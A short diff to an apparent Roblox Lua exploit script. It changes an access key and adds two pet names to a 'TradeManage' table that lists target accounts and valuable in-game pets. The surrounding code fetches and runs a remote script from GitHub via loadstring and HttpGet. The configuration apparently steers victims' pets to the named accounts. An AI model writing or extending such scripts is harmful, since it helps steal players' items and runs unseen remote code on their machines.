@@ -42,7 +42,7 @@ getgenv().YourScript = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0xztnes/testsc/refs/heads/main/Loading"))()
 end
 
-getgenv().KEY = "Shippy"
+getgenv().KEY = "NASACOMPUTER888"
 _G.TradeManage = {
     Target = {
         "KingSentz645770",
@@ -61,6 +61,8 @@ _G.TradeManage = {
         "Kitsune",
         "Mimic Octopus",
         "Dragonfly",
+	"Disco Bee",
+	"Butterfly",
         "Dilophosaurus"
     }
 }
